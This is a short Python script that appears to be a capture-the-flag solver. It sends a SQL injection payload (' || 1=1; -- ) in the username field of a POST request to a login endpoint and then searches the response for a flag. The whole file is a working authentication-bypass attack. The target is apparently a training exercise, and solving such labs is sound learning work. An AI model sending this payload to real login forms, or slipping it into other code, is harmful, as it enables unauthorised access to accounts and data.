import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

BASE_URL = "https://login.quoccacorp.com/v2"
PAYLOAD = "' || 1=1; -- "

class Solver:
    def __init__(self):
        self.session = get_session()

    def main(self):
        response = self.session.post(BASE_URL, data={"username": PAYLOAD})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()